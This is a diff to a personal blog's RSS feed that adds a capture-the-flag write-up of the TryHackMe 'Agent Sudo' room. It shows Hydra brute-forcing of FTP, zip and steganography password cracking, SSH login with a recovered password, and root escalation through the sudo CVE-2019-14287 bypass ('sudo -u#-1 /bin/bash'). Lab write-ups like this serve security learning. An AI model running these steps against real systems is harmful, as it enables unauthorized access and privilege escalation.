@@ -1,4 +1,114 @@
-<?xml version="1.0" encoding="utf-8"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>Davis Freimanis</title><link>https://davisfreimanis.github.io/</link><description>Davis Freimanis blog</description><generator>Hugo 0.68.3 https://gohugo.io/</generator><language>en</language><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright><lastBuildDate>Sat, 09 May 2020 11:21:24 +0000</lastBuildDate><atom:link rel="self" type="application/rss+xml" href="https://davisfreimanis.github.io/rss.xml"/><item><title>Deploying a Hugo Website Using Github Actions</title><link>https://davisfreimanis.github.io/posts/hugo-github-actions/</link><guid isPermaLink="true">https://davisfreimanis.github.io/posts/hugo-github-actions/</guid><pubDate>Tue, 05 May 2020 15:04:12 +0200</pubDate><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright><description><![CDATA[<p>This <a href="https://github.com/davisfreimanis/davisfreimanis.github.io">blog</a> uses Hugo to serve static pages. To make deploying posts easy, I am using Github Actions for automatic deployment. This post will present how it works.</p>
+<?xml version="1.0" encoding="utf-8"?><rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>Davis Freimanis</title><link>https://davisfreimanis.github.io/</link><description>Davis Freimanis blog</description><generator>Hugo 0.68.3 https://gohugo.io/</generator><language>en</language><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright><lastBuildDate>Sat, 09 May 2020 11:21:59 +0000</lastBuildDate><atom:link rel="self" type="application/rss+xml" href="https://davisfreimanis.github.io/rss.xml"/><item><title>Agent Sudo</title><link>https://davisfreimanis.github.io/posts/hacking/writeups/agent-sudo/</link><guid isPermaLink="true">https://davisfreimanis.github.io/posts/hacking/writeups/agent-sudo/</guid><pubDate>Sat, 09 May 2020 10:17:19 +0200</pubDate><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright><description><![CDATA[<p><img src="/images/agent-sudo.png" alt="asdf"></p>
+<p>This room can be found at <a href="https://tryhackme.com/room/agentsudoctf">Tryhackme</a>. It is a pretty simple and fun room that requires the knowlege of a few password cracking tools and privelege escalation.</p>
+<h2 id="enumerate">Enumerate</h2>
+<p>Run <code>nmap</code> with <code>nmap -sV -sC -vv $IP | tee nmap.txt</code> and we see that we have three ports open: 21, 22 and 80.</p>
+<pre><code>PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
+|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Change the user agent to <code>C</code> and get redirected to a page <code>$IP/agent_C_attention.php</code>. We get the information that the user is called <code>chris</code>.</p>
+<pre><code>Attention chris,
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
+
+From,
+Agent R
+</code></pre><h2 id="hash-cracking-and-brute-force">Hash Cracking and Brute-Force</h2>
+<p>We now have a user and know that the password should be weak. Let&rsquo;s start with FTP.</p>
+<h3 id="ftp">FTP</h3>
+<p><code>ftp</code> can be cracked with <code>Hydra</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">hydra -l chris -P /usr/share/wordlists/users/100_common_passwords.txt -vV <span class="nv">$IP</span> ftp
+</code></pre></td></tr></table>
+</div>
+</div><p>Password not found. Let&rsquo;s test a bigger list:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">hydra -l chris -P /usr/share/wordlists/users/1000_common_passwords.txt -vV <span class="nv">$IP</span> ftp
+</code></pre></td></tr></table>
+</div>
+</div><p>Password found!</p>
+<p>Use <code>ftp $IP</code> to connect to the <code>ftp</code> server and download the files using <code>get &lt;file&gt;</code>.</p>
+<h3 id="zip">ZIP</h3>
+<p>Running <code>strings cutie.png</code> reveals that there is something in the file.</p>
+<p>We run <code>binwalk -e cutie.png</code> to extract all embedded files. We find a password protected ZIP file called <code>8702.zip</code>. We can use <code>john</code> to crack the password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">zip2john 8702.zip &gt; hash.txt
+john hash.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>Password found!</p>
+<p>The file <code>To_agentR.txt</code> now has content:</p>
+<pre><code>Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+</code></pre><h3 id="steganography">Steganography</h3>
+<p>Decode the string with base64: <code>echo QXJlYTUx | base64 -d</code>.</p>
+<p>Use <code>steghide</code> to find hidden message in <code>cute_alien.jpg</code>.</p>
+<p><code>steghide extract -sf cute_alien.jpg</code></p>
+<pre><code>Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+</code></pre><p>We now have a password for the user <code>james</code> and can login with <code>ssh</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ssh james@<span class="nv">$IP</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="privlege-escalation">Privlege Escalation</h2>
+<p>We upload <code>LinEnum.sh</code> to the remote server.</p>
+<pre><code>[-] Sudo version:
+Sudo version 1.8.21p2
+</code></pre><p>We find that there is a vulnerability for the <code>sudo</code> version <code>CVE-2019-14287</code>.</p>
+<p><code>sudo -l</code> reveals that <code>james</code> can run the command <code>/bin/bash</code> as any user but <code>root</code> which seems fine.</p>
+<pre><code>User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+</code></pre><p>However, the vulnerability is that if we specify a user ID such as <em>-1</em>, it will run as the id <em>0</em> which is the root user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u#-1 /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><p>This gives us <code>root</code> and we can find the root flag!</p>
+]]></description><category domain="https://davisfreimanis.github.io/categories/writeups/">Writeups</category><category domain="https://davisfreimanis.github.io/tags/tryhackme/">tryhackme</category><category domain="https://davisfreimanis.github.io/tags/sudo/">sudo</category><category domain="https://davisfreimanis.github.io/tags/cracking/">cracking</category></item><item><title>Deploying a Hugo Website Using Github Actions</title><link>https://davisfreimanis.github.io/posts/hugo-github-actions/</link><guid isPermaLink="true">https://davisfreimanis.github.io/posts/hugo-github-actions/</guid><pubDate>Tue, 05 May 2020 15:04:12 +0200</pubDate><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright><description><![CDATA[<p>This <a href="https://github.com/davisfreimanis/davisfreimanis.github.io">blog</a> uses Hugo to serve static pages. To make deploying posts easy, I am using Github Actions for automatic deployment. This post will present how it works.</p>
 <h2 id="github-actions">Github Actions</h2>
 <p>My Github repository contains two branches. Everything that exists in the <code>master</code> branch is automatically published using Github Pages. To separate source code with optimized Hugo pages, I&rsquo;m adding content and modifying the style of the blog in a separate branch <code>source</code>.</p>
 <p>The magic is how the code gets deployed from the <code>source</code> branch to <code>master</code>. This is done with Github Actions and the configuration file is shown below.</p>
